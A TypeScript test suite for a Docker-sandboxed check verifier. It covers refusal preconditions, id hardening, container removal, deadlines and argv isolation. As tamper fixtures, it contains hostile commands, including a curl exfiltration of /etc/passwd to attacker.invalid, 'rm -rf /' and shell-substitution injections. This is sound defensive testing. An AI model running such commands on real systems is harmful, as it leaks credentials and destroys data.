/**
 * The per-CHECK execution policy, driven against a fake docker runner.
 *
 * `git` is real here — the checkpoint check is the whole point of the
 * precondition ladder, and a stubbed git would test nothing. Only `docker` is
 * faked, so every assertion that "no container started" or "c3 never started"
 * is an assertion about the real code path.
 *
 * The four facts this file is about, and nothing else decides a verdict:
 * each check's process exit code, the host's own per-check wall clock, docker's
 * own confirmation that the container is gone, and the overall deadline.
 */
import { execFileSync, type ChildProcess } from 'child_process';
import { EventEmitter } from 'events';
import fs from 'fs';
import os from 'os';
import path from 'path';

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const mockState = vi.hoisted(() => ({ allowlistPath: '' }));
const notifications = vi.hoisted(() => ({ messages: [] as string[] }));

vi.mock('../../config.js', async () => {
  const actual = await vi.importActual<Record<string, unknown>>('../../config.js');
  return {
    ...actual,
    get MOUNT_ALLOWLIST_PATH() {
      return mockState.allowlistPath;
    },
  };
});

// notifyAgent writes a session row and wakes a container; neither exists here.
vi.mock('../approvals/primitive.js', () => ({
  notifyAgent: async (_session: unknown, text: string) => {
    notifications.messages.push(text);
  },
}));

import { createAgentGroup } from '../../db/agent-groups.js';
import { closeDb, getDb, initTestDb } from '../../db/connection.js';
import { runMigrations } from '../../db/migrations/index.js';
import type { Session } from '../../types.js';
import {
  createHandoff,
  deliverHandoffWithInputs,
  markHandoffDelivered,
  reviewHandoff,
  type HandoffRow,
  type ReviewOutcome,
} from '../handoff-ledger/ledger.js';
import '../handoff-ledger/migration.js';
import './migration.js';
import {
  buildCheckArgv,
  CappedSink,
  classifyHandshake,
  createDockerRunner,
  execNoShell,
  HandshakeSplitter,
  HANDSHAKE_MAX_BYTES,
  HANDSHAKE_PREFIX,
  newCheckNonce,
  type DockerRunOptions,
  type DockerRunResult,
  type ExecResult,
} from './docker.js';
import { isSafeHandoffId, runChecksAction, type RunChecksOutcome, type VerifierDeps } from './index.js';
import { deriveVerdict, emptyCheckRecord, frozenChecksSha256, sha256Hex, type CheckRecord } from './record.js';

const ECHO = 'ag-echo';
const ATLAS = 'ag-atlas';
const OTHER = 'ag-other';

/** Any `mkdtemp` archive directory the verifier failed to clean up. */
function leftoverArchiveDirs(): string[] {
  return fs
    .readdirSync(tmpDir)
    .filter((name) => name.startsWith('ncl-verify-'))
    .filter((name) => fs.existsSync(path.join(tmpDir, name, 'checkpoint.tar')));
}

let tmpDir: string;
let repoDir: string;
let dataDir: string;
let gateDir: string;
let gateScript: string;
let configPath: string;
let checkpoint: string;

interface DockerCall {
  file: string;
  argv: string[];
  options: DockerRunOptions;
}

let dockerCalls: DockerCall[];
let auxCalls: string[][];
/** One scripted result per check, in order; missing entries default to exit 0. */
let scripted: Array<Partial<DockerRunResult>>;
/** Scripted `docker inspect --type container` replies, keyed by container name. */
let inspectReplies: Map<string, ExecResult>;
/** Everything else inspects as "No such container": a confirmed removal. */
let defaultInspect: (name: string) => ExecResult;
/** A controllable clock, so the overall deadline is deterministic. */
let clockMs: number;
/** How far the clock jumps per container. */
let clockStepMs: number;
let gate: { hold: Promise<void>; release: () => void } | null;

function noSuchContainer(name: string): ExecResult {
  return {
    code: 1,
    stdout: '',
    stderr: `Error response from daemon: No such container: ${name}\n`,
    ok: false,
    timedOut: false,
    error: 'Command failed: docker inspect',
  };
}

function runResult(over: Partial<DockerRunResult>, nonce: string): DockerRunResult {
  const startedAt = new Date(clockMs).toISOString();
  return {
    exitCode: 0,
    timedOut: false,
    spawnFailed: false,
    // The default is a well-behaved container: it echoes back the host's own
    // nonce, exactly as `run-check.sh` does. A test that wants a setup failure
    // overrides `handshakeLine` with null (never emitted) or a forged value.
    handshakeLine: `${HANDSHAKE_PREFIX}${nonce}`,
    stdout: '',
    stderr: '',
    stdoutBytes: 0,
    stderrBytes: 0,
    stdoutTruncated: false,
    stderrTruncated: false,
    startedAt,
    finishedAt: new Date(clockMs + clockStepMs).toISOString(),
    wallSeconds: clockStepMs / 1000,
    ...over,
  };
}

function writeConfig(limits: Record<string, unknown> = {}): void {
  fs.writeFileSync(
    configPath,
    JSON.stringify({
      echoGroupId: ECHO,
      atlasGroupId: ATLAS,
      projects: { FIXTURE: { hostPath: repoDir, mount: 'fixture' } },
      limits,
    }),
    { mode: 0o600 },
  );
  fs.chmodSync(configPath, 0o600);
}

function deps(over: Partial<VerifierDeps> = {}): VerifierDeps {
  return {
    configPath,
    dataDir,
    gateDir,
    tmpRoot: tmpDir,
    now: () => clockMs,
    // The overall deadline is monotonic in production; here it is driven by the
    // same controllable clock the timestamps use, so the whole run is
    // deterministic and no real time elapses.
    monotonicNs: () => BigInt(clockMs) * 1_000_000n,
    runDocker: async (file, argv, options) => {
      const index = dockerCalls.length;
      dockerCalls.push({ file, argv, options });
      if (gate) await gate.hold;
      const result = runResult(scripted[index] ?? {}, options.nonce);
      clockMs += clockStepMs;
      return result;
    },
    // Real git; faked docker. `docker image inspect` output shape is
    // "<id>|<comma-joined digests>".
    exec: async (file, argv, options) => {
      if (file === 'git') return execNoShell(file, argv, options);
      auxCalls.push([file, ...argv]);
      if (argv[0] === 'inspect' && argv[1] === '--type') {
        const name = argv[3]!;
        return inspectReplies.get(name) ?? defaultInspect(name);
      }
      if (argv[0] === 'rm') return { code: 0, stdout: '', stderr: '', ok: true, timedOut: false };
      return { code: 0, stdout: 'sha256:deadbeef|ncl/agent@sha256:cafe\n', stderr: '', ok: true, timedOut: false };
    },
    resolveImageRef: async () => 'nanoclaw-agent:test',
    ...over,
  };
}

function session(agentGroupId = ECHO): Session {
  return {
    id: 'sess-1',
    agent_group_id: agentGroupId,
    messaging_group_id: null,
    thread_id: null,
    agent_provider: null,
    status: 'active',
    container_status: 'running',
    last_active: null,
    created_at: new Date().toISOString(),
  };
}

async function seedGroups(): Promise<void> {
  const created_at = new Date().toISOString();
  for (const [id, name] of [
    [ECHO, 'Echo'],
    [ATLAS, 'Atlas'],
    [OTHER, 'Other'],
  ]) {
    await createAgentGroup({ id: id!, name: name!, folder: name!.toLowerCase(), agent_provider: null, created_at });
  }
}

async function newHandoff(
  id: string,
  over: { source?: string; reviewer?: string; project?: string } = {},
): Promise<HandoffRow> {
  return createHandoff({
    id,
    sourceAgentGroupId: over.source ?? ATLAS,
    reviewerAgentGroupId: over.reviewer ?? ECHO,
    project: over.project ?? 'FIXTURE',
    goal: 'Prove the verifier refuses what it cannot trust',
    outcome: 'A host-attested evidence record',
    scope: 'verifier module only',
    authority: 'execute',
  });
}

async function deliver(
  row: HandoffRow,
  over: { checks?: string[]; reproduce?: string[]; checkpointOverride?: string } = {},
) {
  return deliverHandoffWithInputs({
    id: row.id,
    actor: row.source_agent_group_id,
    fingerprint: row.fingerprint,
    inputs: {
      class: 'fix',
      checkpoint: over.checkpointOverride ?? checkpoint,
      checks: over.checks ?? ['pnpm test'],
      reproduce: over.reproduce ?? [],
    },
  });
}

/** Create, deliver and run in one step. */
async function runWith(
  id: string,
  checks: string[],
  over: { reproduce?: string[]; deps?: Partial<VerifierDeps> } = {},
): Promise<RunChecksOutcome> {
  const row = await newHandoff(id);
  await deliver(row, { checks, reproduce: over.reproduce });
  return runChecksAction({ handoff_id: id }, session(), deps(over.deps ?? {}));
}

function readRecord(outcome: RunChecksOutcome): Record<string, unknown> {
  return JSON.parse(fs.readFileSync(path.join(outcome.runDir!, 'record.json'), 'utf8'));
}

beforeEach(async () => {
  tmpDir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'ncl-verifier-run-')));
  repoDir = path.join(tmpDir, 'allowed', 'fixture-repo');
  dataDir = path.join(tmpDir, 'data');
  gateDir = path.join(tmpDir, 'gate');
  gateScript = path.join(gateDir, 'run-check.sh');
  fs.mkdirSync(repoDir, { recursive: true });
  fs.mkdirSync(dataDir, { recursive: true });
  fs.mkdirSync(gateDir, { recursive: true });
  fs.writeFileSync(gateScript, '#!/bin/bash\nset -u\ncmd=$(cat)\nexec bash -c "$cmd"\n', { mode: 0o755 });

  fs.writeFileSync(path.join(repoDir, 'package.json'), '{"name":"fixture"}\n');
  execFileSync('git', ['init', '-q'], { cwd: repoDir });
  execFileSync('git', ['add', '.'], { cwd: repoDir });
  execFileSync(
    'git',
    ['-c', 'user.name=fixture', '-c', 'user.email=fixture@example.invalid', 'commit', '-q', '-m', 'fixture'],
    { cwd: repoDir },
  );
  checkpoint = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: repoDir, encoding: 'utf8' }).trim();

  mockState.allowlistPath = path.join(tmpDir, 'mount-allowlist.json');
  fs.writeFileSync(
    mockState.allowlistPath,
    JSON.stringify({
      allowedRoots: [{ path: path.join(tmpDir, 'allowed'), allowReadWrite: false }],
      blockedPatterns: [],
    }),
  );

  configPath = path.join(tmpDir, 'verifier.json');
  writeConfig();

  dockerCalls = [];
  auxCalls = [];
  scripted = [];
  inspectReplies = new Map();
  defaultInspect = noSuchContainer;
  clockMs = Date.parse('2026-09-15T12:00:00.000Z');
  clockStepMs = 1_000;
  gate = null;
  notifications.messages = [];

  const db = await initTestDb();
  await runMigrations(db);
  await seedGroups();
});

afterEach(async () => {
  await closeDb();
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// P7a. The precondition ladder: nothing below starts a container.
// ---------------------------------------------------------------------------
describe('run_checks preconditions', () => {
  it('refuses a caller that is not the configured reviewer group', async () => {
    const row = await newHandoff('H-V1');
    await deliver(row);
    const outcome = await runChecksAction({ handoff_id: 'H-V1' }, session(ATLAS), deps());
    expect(outcome).toMatchObject({ refused: true, reason: 'run_checks is not permitted for this group' });
    expect(dockerCalls).toHaveLength(0);
  });

  it('refuses a handoff whose reviewer or source is not the configured pair', async () => {
    const a = await newHandoff('H-V2a', { reviewer: OTHER });
    await deliver(a);
    expect(await runChecksAction({ handoff_id: 'H-V2a' }, session(), deps())).toMatchObject({
      refused: true,
      reason: 'handoff reviewer is not this group',
    });
    const b = await newHandoff('H-V2b', { source: OTHER });
    await deliver(b);
    expect(await runChecksAction({ handoff_id: 'H-V2b' }, session(), deps())).toMatchObject({
      refused: true,
      reason: 'handoff source is not the configured source agent',
    });
    expect(dockerCalls).toHaveLength(0);
  });

  it('refuses a handoff delivered without captured inputs', async () => {
    const row = await newHandoff('H-V3');
    await markHandoffDelivered(row.id, ATLAS, row.fingerprint);
    expect(await runChecksAction({ handoff_id: 'H-V3' }, session(), deps())).toMatchObject({
      refused: true,
      reason: 'no captured verification inputs for this handoff',
    });
    expect(dockerCalls).toHaveLength(0);
  });

  it('refuses a ledger row or an inputs row edited after capture', async () => {
    const a = await newHandoff('H-V4');
    await deliver(a);
    await getDb().run('UPDATE handoffs SET goal = ? WHERE id = ?', 'a quietly different goal', a.id);
    expect(await runChecksAction({ handoff_id: 'H-V4' }, session(), deps())).toMatchObject({
      refused: true,
      reason: 'ledger fingerprint mismatch',
    });

    const b = await newHandoff('H-V5');
    await deliver(b);
    await getDb().run(
      'UPDATE verification_inputs SET checks_json = ? WHERE handoff_id = ?',
      JSON.stringify(['curl http://attacker.invalid/$(cat /etc/passwd)']),
      b.id,
    );
    expect(await runChecksAction({ handoff_id: 'H-V5' }, session(), deps())).toMatchObject({
      refused: true,
      reason: 'inputs fingerprint mismatch',
    });
    expect(dockerCalls).toHaveLength(0);
  });

  it('refuses an unresolvable project, a non-repository path and an absent checkpoint', async () => {
    const a = await newHandoff('H-V6', { project: 'UNLISTED' });
    await deliver(a);
    expect(await runChecksAction({ handoff_id: 'H-V6' }, session(), deps())).toMatchObject({
      refused: true,
      reason: 'project UNLISTED is not resolvable from the verifier config',
    });

    const notARepo = path.join(tmpDir, 'allowed', 'plain-dir');
    fs.mkdirSync(notARepo, { recursive: true });
    fs.writeFileSync(
      configPath,
      JSON.stringify({
        echoGroupId: ECHO,
        atlasGroupId: ATLAS,
        projects: { FIXTURE: { hostPath: notARepo, mount: 'fixture' } },
      }),
      { mode: 0o600 },
    );
    fs.chmodSync(configPath, 0o600);
    const b = await newHandoff('H-V6c');
    await deliver(b);
    expect(await runChecksAction({ handoff_id: 'H-V6c' }, session(), deps())).toMatchObject({
      refused: true,
      reason: 'project FIXTURE does not resolve to a git repository',
    });

    writeConfig();
    const c = await newHandoff('H-V7');
    await deliver(c, { checkpointOverride: 'deadbee' });
    expect(await runChecksAction({ handoff_id: 'H-V7' }, session(), deps())).toMatchObject({
      refused: true,
      reason: 'checkpoint deadbee not found in FIXTURE',
    });
    expect(dockerCalls).toHaveLength(0);
  });

  it('refuses any field other than handoff_id', async () => {
    const row = await newHandoff('H-EXTRA');
    await deliver(row);
    const outcome = await runChecksAction(
      { handoff_id: 'H-EXTRA', image: 'evil:latest', checks: ['rm -rf /'] },
      session(),
      deps(),
    );
    expect(outcome).toMatchObject({ refused: true, reason: 'unexpected fields: checks, image' });
    expect(dockerCalls).toHaveLength(0);
  });

  it('refuses a changes_required handoff, then runs a freshly delivered one', async () => {
    const a = await newHandoff('H-A');
    await deliver(a);
    await reviewHandoff(a.id, ECHO, a.fingerprint, 'CHANGES REQUIRED', 'needs work');
    expect(await runChecksAction({ handoff_id: 'H-A' }, session(), deps())).toMatchObject({
      refused: true,
      reason: 'handoff is changes_required; only a delivered handoff can be verified',
    });
    expect(dockerCalls).toHaveLength(0);

    const ran = await runWith('H-B', ['test $((2+2)) -eq 4']);
    expect(ran.refused).toBe(false);
    expect(dockerCalls).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// P7b. Hardened ids.
// ---------------------------------------------------------------------------
describe('handoff id hardening', () => {
  it('refuses every id that is not a safe single path segment', async () => {
    const evidenceRoot = path.join(dataDir, 'evidence');
    for (const bad of ['.', '..', '-x', '.hidden', 'a/b', 'a\\b', '%2e%2e', 'x'.repeat(65), '', 'a b']) {
      expect(isSafeHandoffId(bad, evidenceRoot)).toBe(false);
      const outcome = await runChecksAction({ handoff_id: bad }, session(), deps());
      expect(outcome.refused).toBe(true);
      expect(outcome.reason).toBe('handoff_id must match ^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$');
      expect(outcome.runDir).toContain('malformed-handoff-id');
      expect(dockerCalls).toHaveLength(0);
    }
    expect(isSafeHandoffId('COS-07-2026-09-15', evidenceRoot)).toBe(true);
    expect(isSafeHandoffId(`a${'x'.repeat(63)}`, evidenceRoot)).toBe(true);
    expect(isSafeHandoffId(123, evidenceRoot)).toBe(false);

    // Every refusal record went to the one fixed stand-in name.
    expect(fs.readdirSync(path.join(evidenceRoot, ECHO))).toEqual(['malformed-handoff-id']);
    expect(fs.readdirSync(evidenceRoot)).toEqual([ECHO]);
  });

  it('contains an accepted id strictly inside its own directory', async () => {
    const evidenceRoot = path.join(dataDir, 'evidence');
    for (const id of ['a', 'a.b', 'a-b_c.d']) {
      const outcome = await runWith(id, ['true']);
      expect(outcome.refused).toBe(false);
      const prefix = path.join(evidenceRoot, ECHO, id) + path.sep;
      expect(outcome.runDir!.startsWith(prefix)).toBe(true);
      expect(path.relative(prefix, outcome.runDir!).split(path.sep)).toHaveLength(1);
    }
  });
});

// ---------------------------------------------------------------------------
// P7c. The gate.
// ---------------------------------------------------------------------------
describe('the gate directory', () => {
  for (const legacy of ['verify.sh', 'run.sh']) {
    it(`refuses legacy_gate_scripts_present when ${legacy} is still there, before any container`, async () => {
      fs.writeFileSync(path.join(gateDir, legacy), '#!/bin/bash\nexit 0\n', { mode: 0o755 });
      const row = await newHandoff(`H-LEGACY-${legacy.replace('.', '')}`);
      await deliver(row);
      const outcome = await runChecksAction({ handoff_id: row.id }, session(), deps());
      expect(outcome.refused).toBe(true);
      expect(outcome.reason).toBe(`legacy_gate_scripts_present: ${legacy}`);
      expect(dockerCalls).toHaveLength(0);
      expect(auxCalls).toHaveLength(0);
    });
  }

  it('refuses when run-check.sh is missing, and records its hash when it is there', async () => {
    fs.rmSync(gateScript);
    const row = await newHandoff('H-NOGATE');
    await deliver(row);
    const missing = await runChecksAction({ handoff_id: row.id }, session(), deps());
    expect(missing).toMatchObject({ refused: true, reason: 'gate directory must contain run-check.sh' });
    expect(dockerCalls).toHaveLength(0);

    fs.writeFileSync(gateScript, '#!/bin/bash\nset -u\ncmd=$(cat)\nexec bash -c "$cmd"\n', { mode: 0o755 });
    const outcome = await runWith('H-GATE', ['true']);
    expect(readRecord(outcome).gate_run_check_sha256).toBe(sha256Hex(fs.readFileSync(gateScript)));
  });
});

// ---------------------------------------------------------------------------
// P7d. The frozen execution policy.
// ---------------------------------------------------------------------------
describe('the per-CHECK policy matrix', () => {
  it('all pass: one container per check, in order, all removed, ALL_CHECKS_PASSED', async () => {
    const outcome = await runWith('H-ALL', ['true', 'echo hi', 'test 1 -eq 1']);

    expect(outcome.verdict).toBe('ALL_CHECKS_PASSED');
    expect(outcome.error_reason).toBeNull();
    expect(outcome.checks_ran).toBe(3);
    expect(dockerCalls).toHaveLength(3);

    const record = readRecord(outcome);
    const checks = record.checks as CheckRecord[];
    expect(checks.map((c) => c.index)).toEqual([1, 2, 3]);
    expect(checks.every((c) => c.status === 'ran')).toBe(true);
    expect(checks.every((c) => c.exit_code === 0)).toBe(true);
    expect(checks.every((c) => c.timed_out === false)).toBe(true);
    expect(checks.every((c) => c.removal_confirmed === true)).toBe(true);
    expect(checks.every((c) => c.removal_attempts === 1)).toBe(true);

    // A distinct container per check, named `-c<i>`, and each removed exactly
    // once — by its own name, after its own run and before the next one.
    const names = checks.map((c) => c.container_name!);
    expect(new Set(names).size).toBe(3);
    for (let i = 0; i < 3; i++) {
      expect(names[i]).toMatch(new RegExp(`^ncl-verify-ag-echo-H-ALL-[0-9a-z]+-c${i + 1}$`));
      expect(dockerCalls[i]!.options.containerName).toBe(names[i]);
    }
    const removals = auxCalls.filter((argv) => argv[1] === 'rm').map((argv) => argv[3]);
    expect(removals).toEqual(names);
    // The removal of check i is proved BEFORE check i+1 is spawned.
    const order = auxCalls.filter((argv) => argv[1] === 'rm' || argv[1] === 'inspect').map((argv) => argv.join(' '));
    expect(order).toEqual(names.flatMap((name) => [`docker rm -f ${name}`, `docker inspect --type container ${name}`]));
  });

  it('one check fails: the run CONTINUES and the verdict is CHECK_FAILED', async () => {
    scripted = [{}, { exitCode: 1 }, {}];
    const outcome = await runWith('H-FAIL', ['true', 'false', 'true']);

    expect(dockerCalls).toHaveLength(3);
    expect(outcome.verdict).toBe('CHECK_FAILED');
    expect(outcome.error_reason).toBeNull();
    expect(outcome.checks_ran).toBe(3);
    const checks = readRecord(outcome).checks as CheckRecord[];
    expect(checks.map((c) => c.status)).toEqual(['ran', 'ran', 'ran']);
    expect(checks.map((c) => c.exit_code)).toEqual([0, 1, 0]);
  });

  it('one check times out: the run CONTINUES and the verdict is TIMED_OUT', async () => {
    scripted = [{ exitCode: -1, timedOut: true }, {}, {}];
    const outcome = await runWith('H-TO', ['sleep 1000', 'true', 'true']);

    expect(dockerCalls).toHaveLength(3);
    expect(outcome.verdict).toBe('TIMED_OUT');
    const checks = readRecord(outcome).checks as CheckRecord[];
    expect(checks.map((c) => c.status)).toEqual(['ran', 'ran', 'ran']);
    expect(checks[0]!.timed_out).toBe(true);
    expect(checks[0]!.removal_confirmed).toBe(true);
  });

  it('a timeout outranks a failure', async () => {
    scripted = [{ exitCode: 1 }, { exitCode: -1, timedOut: true }];
    const outcome = await runWith('H-TO-OVER-FAIL', ['false', 'sleep 1000']);
    expect(outcome.verdict).toBe('TIMED_OUT');
  });

  const unconfirmed: Array<[string, ExecResult, string]> = [
    [
      'inspect returns a zero exit (the container is still there)',
      { code: 0, stdout: '[{"Id":"abc"}]\n', stderr: '', ok: true, timedOut: false },
      'removal_unconfirmed',
    ],
    [
      'inspect fails with a daemon error that is not "No such container"',
      {
        code: 1,
        stdout: '',
        stderr: 'Error response from daemon: dial unix /var/run/docker.sock: connect: connection refused\n',
        ok: false,
        timedOut: false,
        error: 'Command failed',
      },
      'removal_unconfirmed',
    ],
    [
      'the bounded inspect call is killed by its own timeout',
      { code: 1, stdout: '', stderr: '', ok: false, timedOut: true, error: 'Command failed: SIGKILL' },
      'docker_uncertain',
    ],
  ];

  for (const [name, reply, reason] of unconfirmed) {
    it(`${name}: c2..c3 are not_run and the verdict is VERIFIER_ERROR ${reason}`, async () => {
      // Whatever the first container's own name turns out to be.
      defaultInspect = (containerName) => (containerName.endsWith('-c1') ? reply : noSuchContainer(containerName));
      const outcome = await runWith('H-REMOVAL', ['true', 'true', 'true']);

      expect(dockerCalls).toHaveLength(1);
      expect(outcome.verdict).toBe('VERIFIER_ERROR');
      expect(outcome.error_reason).toBe(reason);
      expect(outcome.checks_ran).toBe(1);

      const checks = readRecord(outcome).checks as CheckRecord[];
      expect(checks.map((c) => c.status)).toEqual(['ran', 'not_run', 'not_run']);
      expect(checks[0]!.removal_confirmed).toBe(false);
      // Three rounds of rm+inspect before failing closed.
      expect(checks[0]!.removal_attempts).toBe(3);
      expect(checks.slice(1).every((c) => c.container_name === null)).toBe(true);
      expect(checks.slice(1).every((c) => c.exit_code === null)).toBe(true);
      // Never a pass, even though the one check that ran exited 0.
      expect(outcome.verdict).not.toBe('ALL_CHECKS_PASSED');
    });
  }

  it('a removal confirmed on the third attempt lets the run continue', async () => {
    let seen = 0;
    defaultInspect = (containerName) => {
      if (!containerName.endsWith('-c1')) return noSuchContainer(containerName);
      seen += 1;
      return seen < 3
        ? { code: 0, stdout: '[{"Id":"abc"}]\n', stderr: '', ok: true, timedOut: false }
        : noSuchContainer(containerName);
    };
    const outcome = await runWith('H-RETRY', ['true', 'true']);
    expect(outcome.verdict).toBe('ALL_CHECKS_PASSED');
    const checks = readRecord(outcome).checks as CheckRecord[];
    expect(checks[0]!.removal_attempts).toBe(3);
    expect(checks[0]!.removal_confirmed).toBe(true);
    expect(checks[1]!.removal_attempts).toBe(1);
  });

  it('a docker client that will not spawn stops the run', async () => {
    scripted = [{}, { exitCode: -1, spawnFailed: true }, {}];
    const outcome = await runWith('H-SPAWN', ['true', 'true', 'true']);
    expect(dockerCalls).toHaveLength(2);
    expect(outcome.verdict).toBe('VERIFIER_ERROR');
    expect(outcome.error_reason).toBe('spawn_failed');
    const checks = readRecord(outcome).checks as CheckRecord[];
    expect(checks.map((c) => c.status)).toEqual(['ran', 'ran', 'not_run']);
  });

  it('a failed checkpoint export stops before any container', async () => {
    const outcome = await runWith('H-ARCHIVE', ['true'], {
      deps: {
        exec: async (file, argv, options) => {
          if (file === 'git' && argv.includes('archive')) {
            return { code: 128, stdout: '', stderr: 'fatal\n', ok: false, timedOut: false, error: 'git archive' };
          }
          if (file === 'git') return execNoShell(file, argv, options);
          return { code: 0, stdout: 'sha256:deadbeef|\n', stderr: '', ok: true, timedOut: false };
        },
      },
    });
    expect(dockerCalls).toHaveLength(0);
    expect(outcome.verdict).toBe('VERIFIER_ERROR');
    expect(outcome.error_reason).toBe('archive_failed');
    expect((readRecord(outcome).checks as CheckRecord[])[0]!.status).toBe('not_run');
    expect(leftoverArchiveDirs()).toEqual([]);
  });

  it('a trusted input edited between the ladder and the export stops with invalid_input', async () => {
    const row = await newHandoff('H-REVALIDATE');
    await deliver(row, { checks: ['true', 'true'] });
    // `git cat-file` is the LAST precondition the ladder runs; the edit lands
    // in the gap between it and the re-validation that guards the export.
    const base = deps();
    const outcome = await runChecksAction(
      { handoff_id: row.id },
      session(),
      deps({
        exec: async (file, argv, options) => {
          const result = await base.exec(file, argv, options);
          if (file === 'git' && argv.includes('cat-file')) {
            await getDb().run(
              'UPDATE verification_inputs SET checks_json = ? WHERE handoff_id = ?',
              JSON.stringify(['curl http://attacker.invalid']),
              row.id,
            );
          }
          return result;
        },
      }),
    );
    expect(outcome.verdict).toBe('VERIFIER_ERROR');
    expect(outcome.error_reason).toBe('invalid_input');
    expect(dockerCalls).toHaveLength(0);
    // The record still carries the FROZEN list, not the tampered one.
    expect(readRecord(outcome).frozen_checks).toEqual(['true', 'true']);
  });
});

// ---------------------------------------------------------------------------
// P7e. The overall deadline and the per-check cap.
// ---------------------------------------------------------------------------
describe('the overall deadline', () => {
  it('gives each check min(perCommandSeconds, remainingOverall)', async () => {
    writeConfig({ wallSeconds: 10, perCommandSeconds: 300 });
    clockStepMs = 4_500;
    const outcome = await runWith('H-CAP', ['a', 'b', 'c']);

    // c1 sees the whole budget, c2 what is left, and c3 never starts because
    // only 1 s of the 10 remained.
    expect(dockerCalls.map((call) => call.options.wallSeconds)).toEqual([10, 5.5]);
    const checks = readRecord(outcome).checks as CheckRecord[];
    expect(checks.map((c) => c.cap_seconds)).toEqual([10, 5.5, null]);
    expect(checks.map((c) => c.status)).toEqual(['ran', 'ran', 'not_run']);
    expect(outcome.verdict).toBe('VERIFIER_ERROR');
    expect(outcome.error_reason).toBe('deadline');
    expect(readRecord(outcome).deadline_seconds).toBe(10);
  });

  it('gives each check perCommandSeconds when that is the smaller of the two', async () => {
    writeConfig({ wallSeconds: 900, perCommandSeconds: 2 });
    clockStepMs = 0;
    await runWith('H-PERCMD', ['a', 'b']);
    expect(dockerCalls.map((call) => call.options.wallSeconds)).toEqual([2, 2]);
  });

  it('stops with `deadline` rather than starting a check that cannot finish', async () => {
    writeConfig({ wallSeconds: 6, perCommandSeconds: 300 });
    clockStepMs = 5_500;
    const outcome = await runWith('H-DEADLINE', ['a', 'b']);
    expect(dockerCalls).toHaveLength(1);
    expect(outcome.error_reason).toBe('deadline');
    expect((readRecord(outcome).checks as CheckRecord[])[1]!.status).toBe('not_run');
  });

  it('a deadline stop takes precedence over a check that timed out', async () => {
    writeConfig({ wallSeconds: 8, perCommandSeconds: 300 });
    clockStepMs = 4_000;
    scripted = [{}, { exitCode: -1, timedOut: true }, {}];
    const outcome = await runWith('H-DEADLINE-TO', ['a', 'b', 'c']);
    expect(outcome.verdict).toBe('VERIFIER_ERROR');
    expect(outcome.error_reason).toBe('deadline');
    expect((readRecord(outcome).checks as CheckRecord[])[1]!.timed_out).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// P9. argv and stdin.
// ---------------------------------------------------------------------------
describe('the docker argv and what rides on stdin', () => {
  it('is the exact frozen argv, with the command ONLY on stdin', async () => {
    const outcome = await runWith('H-ARGV', ['pnpm test']);
    const call = dockerCalls[0]!;
    expect(call.file).toBe('docker');

    const archiveMount = call.argv.find((element) => element.endsWith(':/archive/checkpoint.tar:ro'))!;
    const tarPath = archiveMount.slice(0, archiveMount.indexOf(':/archive/'));
    expect(call.argv).toEqual(
      buildCheckArgv({
        containerName: call.options.containerName,
        uid: process.getuid!(),
        gid: process.getgid!(),
        cpus: '1',
        memory: '1g',
        pids: 256,
        gateRunCheckPath: gateScript,
        archiveTarPath: tarPath,
        imageRef: 'nanoclaw-agent:test',
      }),
    );
    expect(call.argv[call.argv.length - 1]).toBe('/gate/run-check.sh');
    expect(call.argv).toContain('--network');
    expect(call.argv).toContain('none');
    expect(call.argv).toContain('--read-only');
    expect(call.argv).toContain('--cap-drop');
    expect(call.argv).toContain('ALL');
    expect(call.argv).toContain('no-new-privileges');
    expect(call.argv).toContain('/work:rw,size=1g,mode=1777');
    expect(call.argv).toContain('/tmp:rw,size=256m');

    // The command text is on stdin, verbatim, and nowhere else.
    expect(call.options.stdin).toBe('pnpm test');
    expect(call.argv.some((element) => element.includes('pnpm test'))).toBe(false);

    // Exactly two mounts, and they are the two the design allows.
    const mounts = call.argv.filter((element, i) => call.argv[i - 1] === '-v');
    expect(mounts).toEqual([`${gateScript}:/gate/run-check.sh:ro`, `${tarPath}:/archive/checkpoint.tar:ro`]);
    // The gate FILE is mounted, never the gate directory.
    expect(mounts.some((mount) => mount === `${gateDir}:/gate:ro`)).toBe(false);

    // ...and the tar, with its directory, is gone by the time the call returns.
    expect(fs.existsSync(tarPath)).toBe(false);
    expect(fs.existsSync(path.dirname(tarPath))).toBe(false);
    expect(leftoverArchiveDirs()).toEqual([]);
    expect(outcome.runDir).toBeTruthy();
  });

  it('carries nothing of the host, the project or the evidence in any element', async () => {
    const outcome = await runWith('H-SCOPE', ['true', 'true']);
    for (const call of dockerCalls) {
      for (const element of call.argv) {
        expect(typeof element).toBe('string');
        for (const forbidden of [
          'sh -c',
          '$(',
          '`',
          ';',
          repoDir,
          dataDir,
          'data/',
          '.env',
          'docker.sock',
          '/workspace',
          'groups/',
          outcome.runDir!,
        ]) {
          expect(element.includes(forbidden), `${forbidden} appeared in ${element}`).toBe(false);
        }
      }
    }
  });

  it('never puts a REPRODUCE command in any argv or on any stdin, but does record it', async () => {
    const hostile = [
      'rm -rf /work/tree && echo pwned',
      '$(touch /tmp/reproduce-ran)',
      '`touch /tmp/reproduce-ran2`',
      '; touch /tmp/reproduce-ran3;',
      'pnpm test --reporter=$(whoami)',
    ];
    const outcome = await runWith('H-REPRO', ['true', 'true'], { reproduce: hostile });

    expect(outcome.verdict).toBe('ALL_CHECKS_PASSED');
    for (const call of dockerCalls) {
      for (const command of hostile) {
        expect(call.options.stdin).not.toContain(command);
        expect(call.argv.some((element) => element.includes(command))).toBe(false);
      }
    }
    // Stored, recorded and displayed — never executed.
    expect(readRecord(outcome).reproduce).toEqual(hostile);
    const message = notifications.messages[0]!;
    expect(message).toContain('REPRODUCE (documentation only, not executed):');
    for (const command of hostile) expect(message).toContain(command);
    expect(fs.existsSync('/tmp/reproduce-ran')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// C1. The startup handshake: an infrastructure failure is not a CHECK failure.
// ---------------------------------------------------------------------------

/** The subset of `ChildProcess` `createDockerRunner` touches. */
class FakeChild extends EventEmitter {
  stdout = new EventEmitter();
  stderr = new EventEmitter();
  written: string[] = [];
  stdin = Object.assign(new EventEmitter(), {
    end: (payload?: unknown) => {
      if (typeof payload === 'string') this.written.push(payload);
    },
    destroy: () => undefined,
  });
  kill(): boolean {
    return true;
  }
